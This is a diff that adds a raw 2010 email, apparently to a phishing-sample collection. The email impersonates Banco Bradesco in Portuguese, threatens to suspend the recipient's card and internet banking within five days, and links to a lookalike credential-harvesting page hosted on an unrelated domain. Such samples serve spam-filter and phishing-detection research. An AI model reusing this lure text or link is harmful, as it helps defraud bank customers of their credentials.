@@ -1,0 +1,82 @@
+X-Account-Key: account2
+Return-path: <web150@hosts24.de>
+Envelope-to: pablof@correo.uvigo.es
+Delivery-date: Tue, 30 Mar 2010 05:29:03 +0200
+Received: from mail.uvigo.es ([193.146.32.69] helo=grelo.uvigo.es)
+	by cacahuete.uvigo.es with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.69)
+	(envelope-from <web150@hosts24.de>)
+	id 1NwS8V-0004dA-6J
+	for pablof@correo.uvigo.es; Tue, 30 Mar 2010 05:29:03 +0200
+Received: from cogumelo.uvigo.es (antispam1.uvigo.es [193.146.32.120])
+	by grelo.uvigo.es (8.13.8/8.13.8/Debian-3) with ESMTP id o2U3SwqK019470
+	(version=TLSv1/SSLv3 cipher=AES256-SHA bits=256 verify=NOT)
+	for <pablof@correo.uvigo.es>; Tue, 30 Mar 2010 05:29:02 +0200
+Received: from vs148.hosts24.de ([78.143.45.52])
+	by cogumelo.uvigo.es with esmtp (Exim 4.69)
+	(envelope-from <web150@hosts24.de>)
+	id 1NwS8Q-0000wA-80
+	for pablof@correo.uvigo.es; Tue, 30 Mar 2010 05:28:58 +0200
+Received: by vs148.hosts24.de (Postfix, from userid 932)
+	id EB005146F33; Tue, 30 Mar 2010 05:23:41 +0200 (CEST)
+To: pablof@correo.uvigo.es
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Banco Bradesco <bradesco@seguranca.com.br>
+Message-Id: <20100330032416.EB005146F33@vs148.hosts24.de>
+Date: Tue, 30 Mar 2010 05:23:41 +0200 (CEST)
+X-Spam-Flag: No
+X-Spam-Checker-Version: SpamAssassin 3.2.5 (2008-06-10) on cogumelo.uvigo.es
+X-Spam-Status: No, score=4.4 required=5.0 tests=BAYES_40,HTML_IMAGE_ONLY_16,
+	HTML_MESSAGE,MIME_HTML_ONLY,SUBJECT_NEEDS_ENCODING,SUBJ_ILLEGAL_CHARS
+	autolearn=no version=3.2.5
+X-Spam-UVIGO-Status: No, score=4.4 required=5.0 tests=BAYES_40=-0.185,
+	HTML_IMAGE_ONLY_16=1.526,HTML_MESSAGE=0.001,MIME_HTML_ONLY=1.457,
+	SUBJECT_NEEDS_ENCODING=0.001,SUBJ_ILLEGAL_CHARS=1.586 autolearn=no
+	version=3.2.5
+X-Spam-UVIGO-Level: ****
+X-Spam-UVIGO: No
+X-Spam-UVIGO-Score: _SCOREINT_
+Subject: Atualização Chaves de Segurança
+X-Mail-Scanned: Criba + Clamd smtp.uvigo.es
+X-SA-Exim-Connect-IP: 193.146.32.69
+X-SA-Exim-Mail-From: web150@hosts24.de
+X-SA-Exim-Scanned: No (on cacahuete.uvigo.es); SAEximRunCond expanded to false
+
+
+<html>
+
+<Center>
+
+<img src="http://institucional.bradesco.com.br/NetRedeAtendimento/site/img/logo_novo.gif"><Br><font face="verdana" size="2,6">
+
+<b>Prezado Cliente</b>,<br>
+
+Por motivos de segurança comunicamos a todos os clientes que será obrigatório<br> realizar a <B>Atualização do seu Cartão de Chaves de Segurança</B> para que evitem<br> ser cancelados. Evitando assim problemas ao seu acesso pelo Internet-Banking<br> e outros canais de conveniência Bradesco.<br><br>
+
+
+
+Caso não efetue a sua Atualização obrigatória com urgência, o acesso via Caixas-Eletrônicos<br> e Internet-Banking <B>ficará suspenso</B> e seu Cartão junto com Chaves de<br> Segurança serão cancelados, <B>impossibilitando acessos e movimentações</B>.<br><br>
+
+
+
+Basta seguir o procedimento sem substituição das senhas atuais acessando sua<br> conta, atráves do link do nosso site, ou dirija-se a sua Agência de Origem no <B>prazo<br> de até 5 dias úteis</B>.<br><br>
+
+
+
+<A target="_blank" href="http://www.curesforepilepsy.com/css/css/bradesco.com.br.internet.banking.html"><font color="red"><b>Para efetuar a Atualização obrigatória: Clique Aqui.</font></b></a><br><br>
+
+
+
+<B>Atenção</b>: A Atualização obrigatória é apenas concluída a partir do Link<br> fornecido neste e-mail, impossibilitando a atualização por outro Link Bradesco.<br><br>
+
+
+
+Em caso de dúvida, contatar nossa Central de segunda a sexta-feira das 07:00 ás<br> 20:00 horas.<br><Br>
+
+
+
+<B>© 2010 Bradesco SA. Todos os direitos reservados.</b></center>
+
+</html>
+
